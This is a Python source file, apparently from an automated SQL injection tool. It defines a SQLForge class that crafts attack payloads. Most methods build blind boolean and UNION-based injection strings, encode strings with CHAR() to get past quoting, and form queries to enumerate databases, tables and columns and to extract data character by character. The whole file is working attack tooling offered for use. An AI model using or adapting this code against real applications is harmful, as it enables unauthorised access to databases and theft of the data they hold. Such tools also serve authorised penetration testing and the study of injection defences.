#-*- coding: utf-8 -*-

class SQLForge:

    """
    SQLForge

    This class is in charge of providing methods to craft SQL queries. Bascially,
    the methods already implemented fit with most of the DBMS.
    """

    def __init__(self, context):
        """ Constructor

        context: context to associate the forge with.
        """
        self.context = context

    def wrap_bisec(self, sql):
        """
        Wrap a bisection-based query.

        This method must be overriden to provide a way to use bisection given
        a DBMS. There is no universal way to perform this, so it has to be
        implemented in each DBMS plugin.
        """
        raise 'You must define the wrap_bisec() method'

    
    def wrap_string(self, string):
        """
        Wraps a string.

        This method encode the given string and/or add delimiters if required.
        """
        if self.context.require_string_encoding():
            out = 'CHAR('
            for car in string:
                out += str(ord(car))+','
            out = out[:-1] + ')'
        else:
            return "%c%s%c" % (self.context.get_string_delimiter(),string,self.context.get_string_delimiter())
        return out


    def wrap_sql(self, sql):
        """
        Wraps SQL query

        This method wraps an SQL query given the specified context.
        """
        q = self.context.get_string_delimiter()
        if self.context.is_blind():
            if self.context.require_truncate():
                if self.context.in_string():
                    return "%c OR (%s=%s) %s" % (q,sql,self.wrap_field(self.context.get_default_value()),self.context.get_comment())
                elif self.context.in_int():
                    return "%s OR (%s)=%s %s" % (self.context.get_default_value(), sql, self.wrap_field(self.context.get_default_value()), self.context.getComment())
            else:
                if self.context.in_string():
                    return "%c OR (%s=%s) AND %c1%c=%c1" % (q,sql,self.wrap_field(self.context.get_default_value()),q,q,q)
                elif self.context.in_int():
                    return "%s OR (%s)=%s " % (self.context.get_default_value(), sql,self.wrap_field(self.context.get_default_value()))
        else:
            if self.context.require_truncate():
                if self.context.in_string():
                    return "%c AND 1=0 UNION %s %s" % (q, sql, self.context.getComment())
                elif self.context.in_int():
                    return "%s AND 1=0 UNION %s %s" % (self.context.get_default_value(), sql, self.context.get_comment())
            else:
                if self.context.in_string():
                    return "%c AND 1=0 UNION %s" % (q, sql)
                elif self.context.in_int():
                    return "%s AND 1=0 UNION %s" % (self.context.get_default_value(), sql)



    def wrap_field(self,field):
        """
        Wrap a field with delimiters if required.
        """
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s%c" % (q,field,q)
        else:
            return "%s"%field

    def wrap_ending_field(self, field):
        """
        Wrap the last field with a delimiter if required.
        """
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s" % (q,field)
        else:
            return "%s"%field


    def string_len(self, string):
        """
        Forge a piece of SQL retrieving the length of a string.
        """
        return "LENGTH(%s)" % string

    
    def get_char(self, string, pos):
        """
        Forge a piece of SQL returning the n-th character of a string.
        """
        return "SUBSTRING(%s,%d,1)" % (string,pos)


    def concat_str(self, str1, str2):
        """
        Forge a piece of SQL concatenating two strings.
        """
        return "CONCAT(%s,%s)" % (str1, str2)

    
    def ascii(self, char):
        """
        Forge a piece of SQL returning the ascii code of a character.
        """
        return "ASCII(%s)" % char


    def count(self, records):
        """
        Forge a piece of SQL returning the number of rows from a set of records.
        """
        sql= "(SELECT COUNT(*) FROM (%s) AS T1)" % records
        return sql


    def take(self,records, index):
        """
        Forge a piece of SQL returning the n-th record of a set.
        """
        return "(%s LIMIT %d,1)" % (records, index)


    def select_all(self, table, db):
        """
        Forge a piece of SQL returning all records of a given table.
        """
        return "(SELECT * FROM %s.%s)" % (db, table)


    def get_table_field_record(self, field, table, db, pos):
        """
        Forge a piece of SQL returning one record with one column from a table.
        """
        return "(SELECT %s FROM (SELECT * FROM %s.%s) as t0 LIMIT %d,1)"%(field,db,table,pos)


    def forge_cdt(self, val, cmp):
        """
        Forge a piece of SQL creating a condition.
        """
        return "(%s)<%d" % (val,cmp)


    def forge_second_query(self, sql):
        """
        Basic inband query builder.

        Builds the second part of an inband injection (following the UNION).
        """
        query = 'SELECT '
        columns= []        
        fields = self.context.get_inband_fields()
        tag = self.context.get_inband_tag()
        for i in range(len(fields)):
            if i==self.context.get_inband_target():
                columns.append(self.concat_str(self.wrap_string(tag),self.concat_str(sql, self.wrap_string(tag))))
            else:
                if fields[i]=='s':
                    columns.append(self.wrap_string('0'))
                elif fields[i]=='i':
                    columns.append('0')        
        return query + ','.join(columns)


    def get_version(self):
        """
        Forge a piece of SQL returning the DBMS version.

        Must be overriden by each DBMS plugin.
        """
        raise 'You must provide the get_version() method.'


    def get_user(self):
        """
        Forge a piece of SQL returning the current username.
        """
        return 'username()'


    def get_current_database(self):
        """
        Forge a piece of SQL returning the current database name.
        """
        return 'database()'

   
    def get_databases(self):
        """
        Forge a piece of SQL returning all the known databases.
        """
        raise 'You must define the "get_databases" function.'

    def get_database(self, id):
        """
        Forge a piece of SQL returning the name of the id-th database.
        """
        return self.take(self.get_databases(), id)

            
    def get_nb_databases(self):
        """
        Forge a piece of SQL returning the number of databases.
        """
        return self.count(self.get_databases())



    def get_database_name(self, id):
        """
        Forge a piece of SQL returning the name of id-th database.
        """
        return self.take(self.get_databases(),id)


    def get_tables(self,db):
        """
        Forge a piece of SQL returning all the tables of the provided database (db).

        db: target database name.
        """
        raise 'You must provide the get_tables() method.'


    def get_nb_tables(self,db):
        """
        Forge a piece of SQL returning the number of tables.

        db: target database name.
        """
        return self.count(self.get_tables(db))


    def get_table_name(self, id, db):
        """
        Forge a piece of SQL returning the name of a table.

        id: table index
        db: target database name.
        """
        return self.take(self.get_tables(db), id)


    def get_fields(self, table, db):
        """
        Forge a piece of SQL returning all the existing fields of a table.

        table: target table name
        db: target database name
        """
        raise 'You must provide the get_fields() method.'


    def get_nb_fields(self, table, db):
        """
        Forge a piece of SQL returning the number of fields.

        table: target table name
        db: target database name
        """
        return self.count(self.get_fields(table,db))


    def get_field_name(self, table, id, db):
        """
        Forge a piece of SQL returning the field name

        table: target table name
        db: target database name
        id: field index
        """
        return self.take(self.get_fields(table, db), id)
        

    def get_string_len(self, sql):
        """
        Forge a piece of SQL returning the length of a string/subquery.

        sql: source string or sql
        """
        return self.string_len(sql)


    def get_string_char(self, sql, pos):
        """
        Forge a piece of SQL returning the ascii code of a string/sql

        sql: source string or sql
        pos: character position
        """
        return self.ascii(self.get_char(sql, pos))


